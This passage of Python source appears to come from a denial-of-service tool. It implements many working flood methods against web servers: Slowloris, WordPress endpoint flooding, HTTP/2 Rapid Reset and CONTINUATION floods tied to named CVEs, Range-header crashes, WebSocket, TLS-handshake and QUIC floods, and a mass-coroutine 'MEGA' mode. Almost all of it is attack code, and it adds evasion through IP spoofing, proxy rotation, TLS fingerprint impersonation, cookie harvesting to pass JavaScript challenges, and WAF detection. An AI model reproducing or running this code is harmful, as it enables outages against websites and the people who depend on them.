        hexh = '\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               '\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               '\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               '\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               '\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               '\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               '\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               '\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               '\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               '\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               '\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                Tools.send(s, p1)
                for _ in range(self._rpc):
                    Tools.send(s, p2)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    bombardier_path = Path.home() / "go/bin/bombardier"

    def BOMB(self):
        if not self._proxies:
            # Fallback: use GET with high RPC instead
            self.GET()
            return
        try:
            proxy = randchoice(self._proxies)
            while proxy.type == ProxyType.SOCKS4 and len(self._proxies) > 1:
                proxy = randchoice(self._proxies)
        except:
            self.GET()
            return
        bombardier_path = Path.home() / "go/bin/bombardier"
        if not (bombardier_path.exists() or bombardier_path.with_suffix('.exe').exists()):
            self.GET()
            return
        # BOMB: only count requests if bombardier actually completed successfully.
        # Previous version always bumped REQUESTS_SENT += self._rpc regardless of
        # bombardier's exit code — which inflated counters when proxy was dead or
        # bombardier crashed mid-burst.
        with suppress(Exception):
            res = run(
                [str(bombardier_path), f'--connections={min(self._rpc, 10)}',
                 '--http2', '--method=GET', '--latencies', '--timeout=30s',
                 f'--requests={self._rpc}', f'--proxy={proxy}', self._target.human_repr()],
                stdout=PIPE, stderr=PIPE, timeout=30)
            # Bombardier prints "Reqs/sec ..." line when it ran successfully.
            # Only increment if exit code == 0 AND we got real output (not just an error string).
            if res.returncode == 0 and res.stdout and b"Reqs/sec" in res.stdout:
                REQUESTS_SENT += self._rpc
                _adaptive_record_send_result(self._method, True)
            else:
                _adaptive_record_send_result(self._method, False)


    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                while Tools.send(s, payload) and s.recv(1):
                    for i in range(self._rpc):
                        keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                        Tools.send(s, keep)
                        sleep(self._rpc / 15)
                        break
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def SLOWLORIS(self):
        """True Slowloris: open connection, send partial header, keep alive.
           Exhausts Apache/nginx connection pool."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # Send partial GET request — no \r\n\r\n ending
            partial = str.encode(
                f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
                f"Host: {self._target.authority}\r\n"
                f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Connection: keep-alive\r\n"
            )
            s.send(partial)
            REQUESTS_SENT += 1
            BYTES_SEND += len(partial)
            # Keep sending garbage headers slowly
            while self._synevent.is_set():
                keep = str.encode(f"X-{randchoice(self._useragents)[:8]}: {ProxyTools.Random.rand_int(1, 99999999)}\r\n")
                s.send(keep)
                BYTES_SEND += len(keep)
                sleep(ProxyTools.Random.rand_int(5, 15))
        Tools.safe_close(s)

    def WORDPRESS(self):
        """Hit multiple WordPress endpoints per connection: xmlrpc, wp-admin, login, etc."""
        endpoints = [
            "/xmlrpc.php",
            "/wp-admin/admin-ajax.php",
            "/wp-login.php",
            "/wp-cron.php",
            "/wp-json/wp/v2/posts/1",
            "/?rest_route=/wp/v2/users/1",
            "/wp-comments-post.php",
        ]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    ep = randchoice(endpoints)
                    payload = str.encode(
                        f"{self._req_type} {ep} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {randchoice(self._useragents)}\r\n"
                        f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
                        f"{self.SpoofIP}"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Accept-Language: en-US,en;q=0.9\r\n"
                        f"Cache-Control: max-age=0\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    # SPDY compat: ADDITIONAL_HEADERS frame for H2_RST
    def H2(self):
        """HTTP/2 multiplexing flood: 1 connection sends many requests over multiple streams."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # NOTE: scheme check only — proxies (PyRoxy HTTP CONNECT) DO support TLS tunneling
            # for HTTP/2 ALPN handshake. Falling back to GET silently was hiding the actual
            # H2 attack surface from users who enabled proxies for IP protection.
            if self._target.scheme != "https":
                self.GET()
                return
            conn = H2Connection()
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (':method', 'GET'),
                (':authority', self._target.authority),
                (':scheme', 'https'),
                (':path', self._target.raw_path_qs),
                ('user-agent', randchoice(self._useragents)),
                ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                ('accept-encoding', 'gzip, deflate, br'),
                ('accept-language', 'en-US,en;q=0.5'),
            ]
            for i in range(self._rpc):
                stream_id = 1 + i * 2
                conn.send_headers(stream_id, headers)
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
        Tools.safe_close(s)

    def H2_RST(self):
        """HTTP/2 Rapid Reset (CVE-2023-44487): race condition that bypasses
           server concurrency limits. Opens streams → RST_STREAM before server processes.
           Exhausts nginx/apache connection pool regardless of configured limits."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # NOTE: scheme check only — proxies (PyRoxy HTTP CONNECT) DO support TLS tunneling
            # for HTTP/2 ALPN handshake. Falling back to GET silently was hiding the actual
            # H2 attack surface from users who enabled proxies for IP protection.
            if self._target.scheme != "https":
                self.GET()
                return
            conn = H2Connection()
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (':method', 'GET'),
                (':authority', self._target.authority),
                (':scheme', 'https'),
                (':path', self._target.raw_path_qs),
                ('user-agent', randchoice(self._useragents)),
                ('accept', '*/*'),
                ('accept-encoding', 'gzip, deflate, br'),
            ]
            for burst in range(self._rpc):
                # Batch send: many HEADERS frames then many RST_STREAM frames
                # Racing: server allocates stream resources between HEADERS and RST
                batch = min(100, max(10, self._rpc))
                for i in range(batch):
                    stream_id = (burst * batch + i) * 2 + 1
                    conn.send_headers(stream_id, headers, end_stream=False)
                s.sendall(conn.data_to_send())
                for i in range(batch):
                    stream_id = (burst * batch + i) * 2 + 1
                    conn.reset_stream(stream_id)
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += batch
        Tools.safe_close(s)

    _harvested_cookie = None
    _harvest_lock = threading.Lock()

    _async_initialized = False
    _async_session: Any = None
    _async_throttle: Any = None
    _async_waf_detected: str = None

    def ASYNC(self):
        """aiohttp-based high-throughput flood with TLS randomization, adaptive throttle,
           WAF detection, and stealth timing jitter. 10-50x throughput vs blocking GET."""
        global REQUESTS_SENT, BYTES_SEND

        if not HttpFlood._async_initialized:
            HttpFlood._async_initialized = True
            HttpFlood._async_throttle = AdaptiveThrottle(self._rpc)

        throttle = HttpFlood._async_throttle
        target = self._target.human_repr()
        useragent = randchoice(self._useragents)
        referer = randchoice(self._referers) + parse.quote(target)
        # Stealth jitter: randomize inter-request delay (1-50ms)
        jitter = ProxyTools.Random.rand_int(1, 50) / 1000.0
        rpc_current = throttle.rpc

        async def _worker():
            try:
                connector = TCPConnector(
                    ssl=TLSRandomizer.get_ssl_context(),
                    limit=0,
                    force_close=True,
                )
                timeout = ClientTimeout(total=5, connect=3)
                async with ClientSession(
                    connector=connector,
                    timeout=timeout,
                    headers={
                        "User-Agent": useragent,
                        "Referer": referer,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                    },
                ) as session:
                    # Store first session for WAF detection
                    if HttpFlood._async_session is None:
                        HttpFlood._async_session = session
                        try:
                            async with session.get(target, ssl=TLSRandomizer.get_ssl_context()) as resp:
                                waf = WAFDetector.analyze(dict(resp.headers))
                                if HttpFlood._async_waf_detected is None:
                                    HttpFlood._async_waf_detected = waf
                                    logger.info(f"[ASYNC] WAF detected: {waf} on {target}")
                        except Exception:
                            pass

                    for i in range(rpc_current):
                        try:
                            async with session.get(target, ssl=TLSRandomizer.get_ssl_context()) as resp:
                                throttle.report(resp.status)
                                REQUESTS_SENT += 1
                                BYTES_SEND += len(target) + 500
                        except Exception:
                            continue
                        await asyncio.sleep(jitter)
            except Exception:
                pass

        # Per-thread event loop — always create fresh loop, avoid conflicts
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_worker())
            loop.close()
        except Exception:
            pass

    def COOKIE_HARVEST(self):
        """Use Playwright browser to solve JS challenge, harvest cookie, then flood with it."""
        if HttpFlood._harvested_cookie is None:
            with HttpFlood._harvest_lock:
                if HttpFlood._harvested_cookie is None:
                    try:
                        with sync_playwright() as p:
                            browser = p.chromium.launch(headless=True)
                            page = browser.new_page()
                            page.goto(self._target.human_repr(), timeout=30000, wait_until="networkidle")
                            cookies = page.context.cookies()
                            cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
                            browser.close()
                            HttpFlood._harvested_cookie = cookie_str or "NO_COOKIE"
                            logger.info(f"Cookie harvested: {cookie_str[:80]}...")
                    except Exception as e:
                        logger.warning(f"Cookie harvest failed: {e}")
                        HttpFlood._harvested_cookie = "NO_COOKIE"

        cookie = HttpFlood._harvested_cookie or ""
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    payload = str.encode(
                        f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {randchoice(self._useragents)}\r\n"
                        f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
                        f"Cookie: {cookie}\r\n"
                        f"{self.SpoofIP}"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Accept-Language: en-US,en;q=0.5\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)


    def WS(self):
        """WebSocket Flood: upgrade to WS then spam binary frames."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            key = b64encode(randbytes(16)).decode()
            upgrade = str.encode(
                f"GET {self._target.raw_path_qs} HTTP/1.1\r\n"
                f"Host: {self._target.authority}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"\r\n"
            )
            s.sendall(upgrade)
            REQUESTS_SENT += 1
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = s.recv(4096)
                if not chunk:
                    return
                data += chunk
            for _ in range(self._rpc * 10):
                mask = randbytes(4)
                payload_len = randint(64, 65536)
                frame = bytearray()
                frame.append(0x82)
                if payload_len < 126:
                    frame.append(0x80 | payload_len)
                elif payload_len < 65536:
                    frame.append(0x80 | 126)
                    frame.extend(data_pack('>H', payload_len))
                else:
                    frame.append(0x80 | 127)
                    frame.extend(data_pack('>Q', payload_len))
                frame.extend(mask)
                body = bytearray(randbytes(payload_len))
                for i in range(payload_len):
                    body[i] ^= mask[i % 4]
                frame.extend(body)
                s.sendall(bytes(frame))
                REQUESTS_SENT += 1
                BYTES_SEND += len(frame)
        Tools.safe_close(s)

    def GQL(self):
        """GraphQL Batching: multiple queries in 1 POST body."""
        queries = [f'q{i}:__typename' for i in range(randint(10, 50))]
        body = '[{' + '},{'.join(f'{{"query":"{{{q}}}"}}' for q in queries) + '}]'
        extra = (
            f"Content-Length: {len(body)}\r\n"
            "Content-Type: application/json\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "\r\n"
            f"{body}"
        )
        payload: bytes = self.generate_payload(extra)[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def H2_PRIORITY(self):
        """HTTP/2 PRIORITY flood: exclusive dependency tree exhaustion."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # NOTE: scheme check only — proxies (PyRoxy HTTP CONNECT) DO support TLS tunneling
            # for HTTP/2 ALPN handshake. Falling back to GET silently was hiding the actual
            # H2 attack surface from users who enabled proxies for IP protection.
            if self._target.scheme != "https":
                self.GET()
                return
            conn = H2Connection()
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (':method', 'GET'),
                (':authority', self._target.authority),
                (':scheme', 'https'),
                (':path', self._target.raw_path_qs),
                ('user-agent', randchoice(self._useragents)),
                ('accept', '*/*'),
            ]
            conn.send_headers(1, headers, end_stream=True)
            s.sendall(conn.data_to_send())
            REQUESTS_SENT += 1
            for i in range(self._rpc * 50):
                stream_id = (i % 200) * 2 + 3
                parent = stream_id - 2 if stream_id > 1 else 1
                exclusive = 1 if i % 3 == 0 else 0
                weight = randint(0, 256)
                conn.prioritize(stream_id, depends_on=parent,
                               weight=weight, exclusive=bool(exclusive))
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
        Tools.safe_close(s)

    def RANGE_CRASH(self):
        """Range Header DoS: overlapping byte ranges to crash Apache/IIS."""
        ranges = ",".join(
            f"{randint(0, 5000)}-{randint(1, 9999)}"
            for _ in range(randint(200, 1000))
        )
        extra = f"Range: bytes={ranges}\r\nAccept-Encoding: identity\r\n"
        payload: bytes = self.generate_payload(extra)[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)


    def STEALTH(self):
        """Full browser emulation: random viewport, DPR, device-memory, Sec-Ch-Ua
           rotated per request. Evades browser-fingerprint WAFs."""
        viewport_w = randchoice([1536, 1920, 1440, 1366, 1280, 2560])
        viewport_h = randchoice([864, 1080, 900, 768, 720, 1440])
        dpr = randchoice(["1", "1.5", "2", "2.5", "3"])
        device_memory = randchoice(["0.5", "1", "2", "4", "8"])
        platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']
        ua_platform = randchoice(platforms)
        ua_mobile = "?1" if ua_platform in ('"Android"', '"iOS"') else "?0"

        payload = str.encode(
            f"{self._bypass_request_line(self._cache_bust_path())}"
            f"Host: {self._target.authority}\r\n"
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f'Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"\r\n'
            f"Sec-Ch-Ua-Mobile: {ua_mobile}\r\n"
            f"Sec-Ch-Ua-Platform: {ua_platform}\r\n"
            f"Viewport-Width: {viewport_w}\r\n"
            f"Viewport-Height: {viewport_h}\r\n"
            f"DPR: {dpr}\r\n"
            f"Device-Memory: {device_memory}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: max-age=0\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"{self.SpoofIP}"
            f"\r\n"
        )
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def MIX(self):
        """Random method rotation per request: GET→POST→HEAD→OPTIONS→PUT→DELETE cycle.
           Forces WAF to evaluate every request individually, taxing CPU."""
        methods_cycle = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    m = randchoice(methods_cycle)
                    payload = str.encode(
                        f"{m} {self._cache_bust_path()} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {randchoice(self._useragents)}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Accept-Language: en-US,en;q=0.5\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: max-age=0\r\n"
                        f"{self.SpoofIP}"
                        f"\r\n"
                    )
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def RAPID(self):
        """HTTP/2 Rapid Reset v2: continuous HEADERS+RST_STREAM at high rate.
           Bypasses nginx keepalive_requests limit, exhausts stream concurrency."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # NOTE: scheme check only — proxies (PyRoxy HTTP CONNECT) DO support TLS tunneling
            # for HTTP/2 ALPN handshake. Falling back to GET silently was hiding the actual
            # H2 attack surface from users who enabled proxies for IP protection.
            if self._target.scheme != "https":
                self.GET()
                return
            conn = H2Connection()
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (':method', 'GET'),
                (':authority', self._target.authority),
                (':scheme', 'https'),
                (':path', self._target.raw_path_qs),
                ('user-agent', randchoice(self._useragents)),
                ('accept', '*/*'),
                ('accept-encoding', 'gzip, deflate, br'),
            ]
            for _ in range(self._rpc * 50):
                stream_id = randint(3, 2147483647)
                conn.send_headers(stream_id, headers, end_stream=False)
                s.sendall(conn.data_to_send())
                conn.reset_stream(stream_id)
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
        Tools.safe_close(s)

    def QUIC(self):
        """HTTP/3 over QUIC flood — bypasses all HTTP/1.1 and HTTP/2 WAF signatures.
           Uses aioquic. Falls back to ASYNC if QUIC not supported."""
        try:
            from aioquic.asyncio import connect
            from aioquic.quic.configuration import QuicConfiguration
            async def _quic_worker():
                config = QuicConfiguration(is_client=True)
                config.alpn_protocols = ["h3"]
                config.verify_mode = CERT_NONE
                async with connect(
                    self._target.host, self._target.port or 443,
                    configuration=config,
                ) as proto:
                    for _ in range(self._rpc):
                        # Send HTTP/3 request frames via QUIC stream
                        # aioquic wraps h3 — send minimal GET
                        stream_id = proto._quic.get_next_available_stream_id()
                        payload = str.encode(
                            f"GET {self._target.raw_path_qs or '/'} HTTP/3\r\n"
                            f"host: {self._target.authority}\r\n"
                            f"user-agent: {randchoice(self._useragents)}\r\n"
                            f"accept: */*\r\n"
                            f"\r\n"
                        )
                        proto._quic.send_stream_data(stream_id, payload)
                        proto._quic.send_stream_data(stream_id, b"", end_stream=True)
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(payload)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_quic_worker())
            loop.close()
        except (ImportError, Exception):
            self.ASYNC()

    def TLS_FLOOD(self):
        """TLS Handshake Flood — exhaust server SSL/TLS CPU via repeated ClientHello.
           No HTTP layer at all. Opens TCP → TLS handshake → ClientHello → close → repeat.
           Each handshake costs server 2-10x more CPU than HTTP request processing.
           JA3/JA4 fingerprint randomized per connection via TLSRandomizer."""
        import ssl as _ssl
        for _ in range(max(1, self._rpc // 2)):
            s = None
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.settimeout(1.5)
                s.connect(self._raw_target)
                
                if self._target.scheme.lower() == "https":
                    tls = TLSRandomizer.get_ssl_context()
                    try:
                        ssock = tls.wrap_socket(
                            s,
                            server_hostname=self._target.host,
                            server_side=False,
                            do_handshake_on_connect=True,
                            suppress_ragged_eofs=True,
                        )
                        # Handshake completed — server CPU was spent on key exchange.
                        # ONLY count as a real request when handshake actually succeeded.
                        REQUESTS_SENT += 1
                        BYTES_SEND += 512  # ~ ClientHello size
                        _adaptive_record_send_result(self._method, True)
                        ssock.close()
                        s = None
                        continue
                    except Exception:
                        # Handshake failed (server rejected, timeout, TLS error). The
                        # ClientHello DID hit the server but it cost minimal CPU since
                        # the server bailed early. Counting this as a "request" was
                        # inflating the RPS display and misleading users into thinking
                        # the attack was working when it was actually being blocked.
                        # Record as failure for adaptive telemetry, do NOT bump counter.
                        _adaptive_record_send_result(self._method, False)
                        continue
                # Plain HTTP target — TLS_FLOOD is a no-op, log telemetry only.
                # We don't bump REQUESTS_SENT because no useful work was done.
                _adaptive_record_send_result(self._method, False)

            except Exception:
                pass
            finally:
                if s:
                    Tools.safe_close(s)

    def H2_CONT(self):
        """HTTP/2 CONTINUATION Flood — CVE-2024-27316.

           Exploit: HTTP/2 spec allows arbitrary CONTINUATION frames after a HEADERS
           frame, with no upper bound on total header bytes. Many servers (Apache,
           Tomcat, Nghttp2, Node h2, Envoy) buffered all CONTINUATIONs in memory
           before parsing — sending megabytes of CONTINUATION frames per stream
           exhausts heap RAM in seconds and the connection is never counted as
           "complete request" so rate limiters can't see it.

           This is unpatched in many older deployments and even some 2024 builds."""
        s = None
        with suppress(Exception):
            s = self.open_connection()
            if not s:
                return
            # NOTE: scheme check only — proxies (PyRoxy HTTP CONNECT) DO support TLS tunneling
            # for HTTP/2 ALPN handshake. Falling back to GET silently was hiding the actual
            # H2 attack surface from users who enabled proxies for IP protection.
            if self._target.scheme != "https":
                self.GET()
                return
            conn = H2Connection()
            conn.initiate_connection()
            s.sendall(conn.data_to_send())

            # First HEADERS frame WITHOUT END_HEADERS flag (signal more coming)
            base_headers = [
                (':method', 'GET'),
                (':authority', self._target.authority),
                (':scheme', 'https'),
                (':path', self._target.raw_path_qs),
                ('user-agent', randchoice(self._useragents)),
                ('accept', '*/*'),
            ]
            for burst in range(self._rpc):
                stream_id = (burst * 2) + 1  # odd stream IDs only
                conn.send_headers(stream_id, base_headers, end_stream=False)
                # Note: hyper-h2 sets END_HEADERS by default. We send raw frames
                # to bypass that. Build CONTINUATION frame manually:
                # Frame format: [length:24][type=0x09][flags:8][stream_id:32][payload]
                pad_header = b'x-pad-' + b'A' * 100
                # Encode using h2's hpack encoder for valid header block fragments
                try:
                    encoded = conn.encoder.encode([(b'x-pad-' + str(i).encode(), b'A' * 200)
                                                   for i in range(50)])
                except Exception:
                    encoded = b'A' * 4000

                # Send 100 CONTINUATION frames per stream → 100 × 4KB = 400KB headers
                for cont_idx in range(100):
                    flag = 0x04 if cont_idx == 99 else 0x00  # END_HEADERS only on last
                    frame_len = len(encoded)
                    frame = (
                        frame_len.to_bytes(3, 'big') +
                        b'\x09' +  # type = CONTINUATION
                        bytes([flag]) +
                        stream_id.to_bytes(4, 'big') +
                        encoded
                    )
                    s.sendall(frame)
                    BYTES_SEND += len(frame)
                REQUESTS_SENT += 1
        Tools.safe_close(s)

    def IMPERSONATE(self):
        """JA3/JA4 Spoofing via curl_cffi — impersonates real Chrome/Firefox/Safari
           TLS fingerprint at the byte level. Most Python TLS stacks have a
           recognizable JA3 fingerprint that WAFs blocklist. curl_cffi uses
           Chrome's actual TLS implementation compiled to a shared library.

           Falls back to ASYNC if curl_cffi not installed."""
        try:
            from curl_cffi import requests as curl_req
        except ImportError:
            self.ASYNC()
            return

        global REQUESTS_SENT, BYTES_SEND
        impersonate_targets = ["chrome120", "chrome116", "chrome110", "safari17_0",
                               "edge99", "firefox120"]
        target_url = self._target.human_repr()
        with suppress(Exception):
            for _ in range(self._rpc):
                impersonate = randchoice(impersonate_targets)
                try:
                    proxy = None
                    if self._proxies:
                        p = randchoice(self._proxies)
                        proxy = p.asRequest()
                    r = curl_req.get(
                        target_url,
                        impersonate=impersonate,
                        timeout=8,
                        proxies=proxy,
                        verify=False,
                        allow_redirects=True,
                    )
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(target_url) + 500
                    _adaptive_record_status(r.status_code, self._method)
                except Exception:
                    continue

    def MEGA(self):
        """🌑 MEGA — King Yami "Anti-Magic" mode. Push beyond OS thread limits.

           Each MEGA worker thread fires 2000 concurrent asyncio coroutines
           sharing 1 OS thread. With 100 MEGA threads = 200,000 effective
           concurrent requests, with single-process firepower that beats
           multiprocess for I/O-bound flooding.

           Why this beats normal threads:
           - 1 thread + 2000 coroutines uses ~10MB RAM (vs 2000 threads = 16GB)
           - No OS thread overhead (context switches in Python user-space)
           - No GIL contention because coroutines are cooperative
           - Single TCP listen socket can serve thousands of in-flight requests"""
        global REQUESTS_SENT, BYTES_SEND

        target = self._target.human_repr()
        useragents = self._useragents
        referers = self._referers

        async def _mega_worker():
            CONCURRENCY = 2000  # 2000 coroutines per OS thread
            connector = TCPConnector(
                ssl=TLSRandomizer.get_ssl_context(),
                limit=0,  # unlimited connections (we control via semaphore)
                ttl_dns_cache=300,
                use_dns_cache=True,
                force_close=False,  # keepalive!
                enable_cleanup_closed=True,
            )
            timeout = ClientTimeout(total=10, connect=4)
            sem = asyncio.Semaphore(CONCURRENCY)

            async def _one_req(session):
                async with sem:
                    try:
                        ua = randchoice(useragents)
                        ref = randchoice(referers) + parse.quote(target)
                        async with session.get(
                            target,
                            ssl=TLSRandomizer.get_ssl_context(),
                            headers={
                                "User-Agent": ua,
                                "Referer": ref,
                                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Accept-Language": "en-US,en;q=0.9",
                                "Cache-Control": "no-cache",
                                "Connection": "keep-alive",
                            },
                            allow_redirects=False,
                        ) as resp:
                            REQUESTS_SENT += 1
                            BYTES_SEND += len(target) + 500
                            try:
                                _adaptive_record_status(resp.status, self._method)
                            except Exception:
                                pass
                    except Exception:
                        pass

            try:
                async with ClientSession(
                    connector=connector,
                    timeout=timeout,
                ) as session:
                    # Fire CONCURRENCY coroutines per round, multiple rounds for duration
                    for round_n in range(self._rpc * 5):
                        tasks = [asyncio.create_task(_one_req(session))
                                 for _ in range(CONCURRENCY)]
                        await asyncio.gather(*tasks, return_exceptions=True)
            except Exception:
                pass

        # Per-thread event loop
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_mega_worker())
            loop.close()
        except Exception:
            pass


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:

        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

